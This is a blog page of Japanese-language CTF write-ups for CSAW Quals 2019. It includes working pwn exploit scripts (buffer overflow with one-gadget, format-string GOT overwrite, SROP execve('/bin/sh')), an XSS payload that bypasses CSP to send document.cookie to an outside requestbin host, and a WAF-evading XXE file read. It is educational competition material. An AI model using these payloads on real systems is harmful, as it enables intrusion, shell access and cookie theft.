@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang='en' dir='auto'><head>
+  <meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='description' content='Misc mcgriddlev2  問題文にFLAGが記載されている flag{W3lcome_7o_CSAW_QUALS_2019!}  Pwn baby_boi (50pt)  シンプルなBOFでIPが奪える問題 libcのアドレスを出力してくれているので、配布されたlibcでオフセット求めてOne-Gadget に飛ばしてシェルを奪う  #!/usr/bin/env ruby # coding: ascii-8bit require &#39;pwn&#39; $z = Sock.new &#34;localhost&#34;, 8888 $z = Sock.new &#34;pwn.chal.csaw.io&#34;, 1005 libc = ELF.new &#34;./libc-2.27.so&#34; #libc = ELF.new &#34;/lib/x86_64-linux-gnu/libc-2.29.so&#34; def z; $z; end z.recvuntil(&#34;\n&#34;) libc_printf = z.recvuntil(&#34;\n&#34;).match(/: (.&#43;)/)[1].to_i(16) libc_base = libc_printf - libc.symbols[&#34;printf&#34;] puts &#34;%x&#34; % libc_base payload = &#34;A&#34; * 40 payload &lt;&lt; p64(libc_base &#43; 0x4f322) z.sendline(payload) z.interact  flag{baby_boi_dodooo_doo_doo_dooo}  GOT Milk?'>
+<meta name='theme-color' content='#ffcd00'>
+
+<meta property='og:title' content='Csaw2019 writeup • $ make life'>
+<meta property='og:description' content='Misc mcgriddlev2  問題文にFLAGが記載されている flag{W3lcome_7o_CSAW_QUALS_2019!}  Pwn baby_boi (50pt)  シンプルなBOFでIPが奪える問題 libcのアドレスを出力してくれているので、配布されたlibcでオフセット求めてOne-Gadget に飛ばしてシェルを奪う  #!/usr/bin/env ruby # coding: ascii-8bit require &#39;pwn&#39; $z = Sock.new &#34;localhost&#34;, 8888 $z = Sock.new &#34;pwn.chal.csaw.io&#34;, 1005 libc = ELF.new &#34;./libc-2.27.so&#34; #libc = ELF.new &#34;/lib/x86_64-linux-gnu/libc-2.29.so&#34; def z; $z; end z.recvuntil(&#34;\n&#34;) libc_printf = z.recvuntil(&#34;\n&#34;).match(/: (.&#43;)/)[1].to_i(16) libc_base = libc_printf - libc.symbols[&#34;printf&#34;] puts &#34;%x&#34; % libc_base payload = &#34;A&#34; * 40 payload &lt;&lt; p64(libc_base &#43; 0x4f322) z.sendline(payload) z.interact  flag{baby_boi_dodooo_doo_doo_dooo}  GOT Milk?'>
+<meta property='og:url' content='https://owlinux1000.github.io/blog/csaw2019/'>
+<meta property='og:site_name' content='$ make life'>
+<meta property='og:type' content='article'><meta property='article:section' content='blog'><meta property='article:published_time' content='2019-09-16T09:50:28&#43;09:00'/><meta property='article:modified_time' content='2019-09-16T09:50:28&#43;09:00'/><meta name='twitter:card' content='summary'><meta name='twitter:site' content='@encry1024'>
+
+<meta name="generator" content="Hugo 0.73.0" />
+
+  <title>Csaw2019 writeup • $ make life</title>
+  <link rel='canonical' href='https://owlinux1000.github.io/blog/csaw2019/'>
+  
+  
+  <link rel='icon' href='/favicon.ico'>
+<link rel='stylesheet' href='/assets/css/main.ab98e12b.css'><link rel='stylesheet' href='/css/custom.css'><style>
+:root{--color-accent:#ffcd00;}
+</style>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-154126244-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+  
+
+</head>
+<body class='page type-blog has-sidebar'>
+
+  <div class='site'><div id='sidebar' class='sidebar'>
+  <a class='screen-reader-text' href='#main-menu'>Skip to Main Menu</a>
+
+  <div class='container'><section class='widget widget-about sep-after'>
+  <header>
+    
+    <div class='logo'>
+      <a href='/'>
+        <img src='/images/me.jpg'>
+      </a>
+    </div>
+    
+    <h2 class='title site-title '>
+      <a href='/'>
+      $ make life
+      </a>
+    </h2>
+    <div class='desc'>
+    Welcome to my homepage :)
+    </div>
+  </header>
+
+</section>
+</div>
+
+  <div class='sidebar-overlay'></div>
+</div><div class='main'><nav id='main-menu' class='menu main-menu' aria-label='Main Menu'>
+  <div class='container'>
+    <a class='screen-reader-text' href='#content'>Skip to Content</a>
+
+<button id='sidebar-toggler' class='sidebar-toggler' aria-controls='sidebar'>
+  <span class='screen-reader-text'>Toggle Sidebar</span>
+  <span class='open'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="3" y1="12" x2="21" y2="12" />
+<line x1="3" y1="6" x2="21" y2="6" />
+<line x1="3" y1="18" x2="21" y2="18" />
+</svg>
+</span>
+  <span class='close'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="18" y1="6" x2="6" y2="18" />
+<line x1="6" y1="6" x2="18" y2="18" />
+</svg>
+</span>
+</button>
+    <ul><li class='item'>
+        <a href='/resume/'>Résumé</a>
+      </li><li class='item'>
+        <a href='/blog/'>Blog</a>
+      </li><li class='item'>
+        <a href='/private/'>Private</a>
+      </li></ul>
+  </div>
+</nav><div class='header-widgets'>
+        <div class='container'></div>
+      </div>
+
+      <header id='header' class='header site-header'>
+        <div class='container sep-after'>
+          <div class='header-info'><p class='site-title title'>$ make life</p><p class='desc site-desc'>Making the world more secure</p>
+          </div>
+        </div>
+      </header>
+
+      <main id='content'>
+
+
+<article lang='en' class='entry'>
+  <header class='header entry-header'>
+  <div class='container sep-after'>
+    <div class='header-info'>
+      <h1 class='title'>Csaw2019 writeup</h1>
+      
+
+    </div>
+    <div class='entry-meta'>
+  <span class='posted-on'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><rect x="3" y="4" width="18" height="18" rx="2" ry="2" />
+<line x1="16" y1="2" x2="16" y2="6" />
+<line x1="8" y1="2" x2="8" y2="6" />
+<line x1="3" y1="10" x2="21" y2="10" />
+</svg>
+<span class='screen-reader-text'>Posted on </span>
+  <time class='entry-date' datetime='2019-09-16T09:50:28&#43;09:00'>2019, Sep 16</time>
+</span>
+
+  
+  
+<span class='reading-time'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><circle cx="12" cy="12" r="10" />
+<polyline points="12 6 12 12 15 15" />
+</svg>
+3 mins read
+</span>
+
+
+</div>
+
+
+  </div>
+</header>
+
+  
+  
+
+  <div class='container entry-content'>
+  <h2 id="misc">Misc</h2>
+<h3 id="mcgriddlev2">mcgriddlev2</h3>
+<ul>
+<li>問題文にFLAGが記載されている</li>
+<li><strong>flag{W3lcome_7o_CSAW_QUALS_2019!}</strong></li>
+</ul>
+<h2 id="pwn">Pwn</h2>
+<h3 id="baby_boi-50pt">baby_boi (50pt)</h3>
+<ul>
+<li>シンプルなBOFでIPが奪える問題</li>
+<li>libcのアドレスを出力してくれているので、配布されたlibcでオフセット求めてOne-Gadget に飛ばしてシェルを奪う</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
+<span style="color:#75715e"># coding: ascii-8bit</span>
+require <span style="color:#e6db74">&#39;pwn&#39;</span>
+$z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#ae81ff">8888</span>
+$z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;pwn.chal.csaw.io&#34;</span>, <span style="color:#ae81ff">1005</span>
+libc <span style="color:#f92672">=</span> <span style="color:#66d9ef">ELF</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;./libc-2.27.so&#34;</span>
+<span style="color:#75715e">#libc = ELF.new &#34;/lib/x86_64-linux-gnu/libc-2.29.so&#34;</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">z</span>; $z; <span style="color:#66d9ef">end</span>
+z<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+libc_printf <span style="color:#f92672">=</span> z<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>match(<span style="color:#e6db74">/: (.+)/</span>)<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">].</span>to_i(<span style="color:#ae81ff">16</span>)
+libc_base <span style="color:#f92672">=</span> libc_printf <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;printf&#34;</span><span style="color:#f92672">]</span>
+puts <span style="color:#e6db74">&#34;%x&#34;</span> <span style="color:#f92672">%</span> libc_base
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4f322</span>)
+z<span style="color:#f92672">.</span>sendline(payload)
+z<span style="color:#f92672">.</span>interact
+</code></pre></div><ul>
+<li><strong>flag{baby_boi_dodooo_doo_doo_dooo}</strong></li>
+</ul>
+<h3 id="got-milk-50pt">GOT Milk? (50pt)</h3>
+<ul>
+<li>独自の共有オブジェクトとバイナリが配られる</li>
+<li><code>set LD_LIBRARY_PATH ./</code> でカレントディレクトリの共有オブジェクトを見るようにする</li>
+<li>FSBがあるので、それを使ってGOT Overwriteする</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
+<span style="color:#75715e"># coding: ascii-8bit</span>
+require <span style="color:#e6db74">&#39;pwn&#39;</span>
+require <span style="color:#e6db74">&#39;fsa&#39;</span>
+<span style="color:#75715e">#$z = Sock.new &#34;localhost&#34;, 8888</span>
+$z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;pwn.chal.csaw.io&#34;</span>, <span style="color:#ae81ff">1004</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">z</span>; $z; <span style="color:#66d9ef">end</span>
+value <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x89</span>
+fmt <span style="color:#f92672">=</span> <span style="color:#66d9ef">FSA</span><span style="color:#f92672">.</span>new()
+fmt<span style="color:#f92672">[</span><span style="color:#ae81ff">0x804a010</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> value
+payload <span style="color:#f92672">=</span> fmt<span style="color:#f92672">.</span>payload(<span style="color:#ae81ff">7</span>) <span style="color:#75715e"># index of argument</span>
+puts z<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;? &#34;</span>)
+z<span style="color:#f92672">.</span>sendline(payload)
+puts z<span style="color:#f92672">.</span>recv
+</code></pre></div><ul>
+<li><strong>flag{y0u_g00000t_mi1k_4_M3!?}</strong></li>
+</ul>
+<h3 id="small_boi-100pt">small_boi (100pt)</h3>
+<ul>
+<li>statically linked でstrippedな小さなバイナリが与えられる</li>
+<li>sig_return システムコールを呼ぶようなraxの設定のされ方があるのと自明なBOFがあるので、Sigreturn ROP (SROP) で <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> を実行する
+<ul>
+<li>SROPは、スタックの値を使ってsig_return実行時にレジスタの値を代入する攻撃</li>
+<li>これを使ってrdiやrsi、ripなどが設定できるため任意のシステムコールを呼べる</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
+<span style="color:#75715e"># coding: ascii-8bit</span>
+require <span style="color:#e6db74">&#39;pwn&#39;</span>
+<span style="color:#75715e">#$z = Sock.new &#34;localhost&#34;, 8888</span>
+$z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;pwn.chal.csaw.io&#34;</span>, <span style="color:#ae81ff">1002</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">z</span>; $z; <span style="color:#66d9ef">end</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x40017c</span>)
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># r8~r15</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x4001ca</span>) <span style="color:#75715e"># rdi = /bin/sh</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># rsi</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># rbp</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># </span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># </span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x3b</span>) <span style="color:#75715e"># rax = 0x3b </span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># rcx</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0</span>)   <span style="color:#75715e"># rsp</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x00400185</span>) <span style="color:#75715e"># rip = syscall</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x0</span>) <span style="color:#75715e"># eflags</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p16(<span style="color:#ae81ff">0x33</span>) <span style="color:#75715e"># cs</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p16(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">&lt;&lt;</span> p16(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">&lt;&lt;</span> p16(<span style="color:#ae81ff">0x2b</span>) <span style="color:#75715e"># ss</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span> <span style="color:#75715e"># err ~ union</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># reserved[8]</span>
+z<span style="color:#f92672">.</span>sendline payload
+z<span style="color:#f92672">.</span>interact
+</code></pre></div><ul>
+<li><strong>flag{sigrop_pop_pop_pop}</strong></li>
+</ul>
+<h3 id="traveller">traveller</h3>
+<ul>
+<li>解けなかったのでwriteupを見た</li>
+<li>Off-by-oneがあるためHeap問題かと思ったら操作対象のインデックスの入力に負数が入力できるOOB問題</li>
+<li>編集コマンドで、<code>-50</code> をするとfree@gotを書き換えられたのでこれを使って<code>cat_flag</code>関数に飛ばす</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
+<span style="color:#75715e"># coding: ascii-8bit</span>
+require <span style="color:#e6db74">&#39;pwn&#39;</span>
+$z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;pwn.chal.csaw.io&#34;</span>, <span style="color:#ae81ff">1003</span>
+<span style="color:#75715e">#elf = ELF.new &#34;./traveller&#34;</span>
+<span style="color:#75715e">#libc = ELF.new &#34;./libc-2.23.so&#34;</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">:debug</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">z</span>; $z; <span style="color:#66d9ef">end</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(dist, dest)
+  z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;1&#34;</span>
+  z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;&gt; &#34;</span>
+  z<span style="color:#f92672">.</span>sendline dist<span style="color:#f92672">.</span>to_s
+  z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;: &#34;</span>
+  z<span style="color:#f92672">.</span>sendline dest
+  z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;&gt; &#34;</span>
+<span style="color:#66d9ef">end</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">change</span>(dist, dest)
+  z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;2&#34;</span>
+  z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;: &#34;</span>
+  z<span style="color:#f92672">.</span>sendline dist<span style="color:#f92672">.</span>to_s
+  z<span style="color:#f92672">.</span>send dest
+  z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;&gt; &#34;</span>
+<span style="color:#66d9ef">end</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(dist)
+  z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;3&#34;</span>
+  z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;: &#34;</span>
+  z<span style="color:#f92672">.</span>sendline dist<span style="color:#f92672">.</span>to_s
+  z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;&gt; &#34;</span>
+<span style="color:#66d9ef">end</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>(dist)
+  z<span style="color:#f92672">.</span>sendline <span style="color:#e6db74">&#34;4&#34;</span>
+  z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;&gt;&#34;</span>
+  z<span style="color:#f92672">.</span>sendline dist<span style="color:#f92672">.</span>to_s
+  <span style="color:#66d9ef">return</span> z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;&gt; &#34;</span>
+<span style="color:#66d9ef">end</span>
+tmp <span style="color:#f92672">=</span> z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;&gt; &#34;</span>
+stack_address <span style="color:#f92672">=</span> tmp<span style="color:#f92672">.</span>match(<span style="color:#e6db74">/.\n(.*) \n\n/</span>)<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">].</span>to_i(<span style="color:#ae81ff">16</span>)
+add(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;AAAAAAAA&#34;</span>)
+change(<span style="color:#f92672">-</span><span style="color:#ae81ff">50</span>, p64(<span style="color:#ae81ff">0x4008b6</span>))
+puts delete(<span style="color:#ae81ff">0</span>)
+</code></pre></div><ul>
+<li><strong>flag{h0pe_y0u_3nj0y_ur_j0urn3y}</strong></li>
+</ul>
+<h2 id="rev">Rev</h2>
+<h3 id="beleaf">Beleaf</h3>
+<ul>
+<li>バイナリ中にFLAGに使われる文字列とインデックスの配列があるので、それを引っこ抜いてきて実行する</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
+
+idxs <span style="color:#f92672">=</span> <span style="color:#f92672">[</span><span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x9</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x8</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x9</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x3</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0x4</span>, <span style="color:#ae81ff">0x3</span>, <span style="color:#ae81ff">0x5</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0x2e</span>, <span style="color:#ae81ff">0xa</span>, <span style="color:#ae81ff">0x3</span>, <span style="color:#ae81ff">0xa</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x3</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x2e</span>, <span style="color:#ae81ff">0x16</span>, <span style="color:#ae81ff">0x2e</span>, <span style="color:#ae81ff">0xa</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x6</span><span style="color:#f92672">]</span>
+
+flag <span style="color:#f92672">=</span> <span style="color:#f92672">[</span><span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x7b</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x6e</span>, <span style="color:#ae81ff">0x79</span>, <span style="color:#ae81ff">0x7d</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x75</span><span style="color:#f92672">].</span>map(<span style="color:#f92672">&amp;</span><span style="color:#e6db74">:chr</span>)
+
+idxs<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>i<span style="color:#f92672">|</span>
+  print flag<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>
+<span style="color:#66d9ef">end</span>
+</code></pre></div><ul>
+<li><strong>flag{we_beleaf_in_your_re_future}</strong></li>
+</ul>
+<h2 id="web">Web</h2>
+<h3 id="baby-csp">baby csp</h3>
+<ul>
+<li>CSPが有効なXSS問題
+<ul>
+<li><code>default-src 'self'; script-src 'self' *.google.com; connect-src *</code></li>
+</ul>
+</li>
+<li>上記のCSPからJSONPエンドポイントでのXSSを使う
+<ul>
+<li><a href="https://inside.pixiv.blog/kobo/5137">https://inside.pixiv.blog/kobo/5137</a></li>
+</ul>
+</li>
+<li>FLAGは、Cookieにあるので、requestbin を使ってPOSTさせるJavaScriptを埋め込む</li>
+<li><code>&lt;script src=&quot;https://accounts.google.com/o/oauth2/revoke?callback=navigator.sendBeacon('http://requestbin.net/r/ugix54ug', document.cookie)&quot;&gt;&lt;/script&gt;</code></li>
+<li><strong>flag{csp_will_solve_EVERYTHING}</strong></li>
+</ul>
+<h3 id="unagi">unagi</h3>
+<ul>
+<li>解けなかったのでwriteupを見た</li>
+<li>XMLがアップロードできるので、XXEだとわかるが、WAFがありいくつかのキーワード(ENTITYやSYSTEMなど)が使えない
+<ul>
+<li>PUBLIC は使えたりした</li>
+</ul>
+</li>
+<li>結論としては、UTF-8ではなくUTF-16BEでアップロードすればWAFをBypassできるというものだった
+<ul>
+<li>試してたが、普通にXXEとしてうまくないファイルだったためこの方針を諦めてしまっていたのが解けない原因っぽい</li>
+</ul>
+</li>
+<li><code>cat x.xml | iconv -f UTF-8 -t UTF-16BE &gt; x_utf-16.xml</code> などで作成してアップロードする</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE root[
+</span><span style="color:#75715e">&lt;!ENTITY pass SYSTEM &#34;file:///flag.txt&#34;&gt;</span>
+]&gt;
+<span style="color:#f92672">&lt;users&gt;</span>
+  <span style="color:#f92672">&lt;user&gt;</span>
+    <span style="color:#f92672">&lt;username&gt;</span>alice2<span style="color:#f92672">&lt;/username&gt;</span>
+    <span style="color:#f92672">&lt;password&gt;</span>passwd1<span style="color:#f92672">&lt;/password&gt;</span>
+    <span style="color:#f92672">&lt;name&gt;</span>Alice2<span style="color:#f92672">&lt;/name&gt;</span>
+    <span style="color:#f92672">&lt;email&gt;</span>alice2@fakesite.com<span style="color:#f92672">&lt;/email&gt;</span>
+    <span style="color:#f92672">&lt;group&gt;</span>CSAW2019<span style="color:#f92672">&lt;/group&gt;</span>
+    <span style="color:#f92672">&lt;intro&gt;</span>&amp;pass;<span style="color:#f92672">&lt;/intro&gt;</span>
+  <span style="color:#f92672">&lt;/user&gt;</span>
+<span style="color:#f92672">&lt;/users&gt;</span>
+</code></pre></div><ul>
+<li><strong>flag{n0w_i&rsquo;m_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}</strong></li>
+</ul>
+
+</div>
+
+  
+<footer class='entry-footer'>
+  <div class='container sep-before'><div class='categories'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M22,19a2,2,0,0,1-2,2H4a2,2,0,0,1-2-2V5A2,2,0,0,1,4,3H9l2,3h9a2,2,0,0,1,2,2Z" />
+</svg>
+<span class='screen-reader-text'>Categories: </span><a class='category' href='/categories/writeup/'>writeup</a></div>
+
+  </div>
+</footer>
+
+
+</article>
+
+<nav class='entry-nav'>
+  <div class='container'><div class='prev-entry sep-before'>
+      <a href='/blog/harekazectf2019/'>
+        <span aria-hidden='true'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="20" y1="12" x2="4" y2="12" />
+<polyline points="10 18 4 12 10 6" />
+</svg>
+ Previous</span>
+        <span class='screen-reader-text'>Previous post: </span>HarekazeCTF 2019 writeup</a>
+    </div><div class='next-entry sep-before'>
+      <a href='/blog/greenhornd_writeup/'>
+        <span class='screen-reader-text'>Next post: </span>CSAW CTF 2014 Greenhornd writeup<span aria-hidden='true'>Next <svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="4" y1="12" x2="20" y2="12" />
+<polyline points="14 6 20 12 14 18" />
+</svg>
+</span>
+      </a>
+    </div></div>
+</nav>
+
+
+
+
+      </main>
+
+      <footer id='footer' class='footer'>
+        <div class='container sep-before'><section class='widget widget-social_menu sep-after'><nav aria-label='Social Menu'>
+    <ul><li>
+        <a href='https://github.com/owlinux1000' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Open Github account in new tab</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
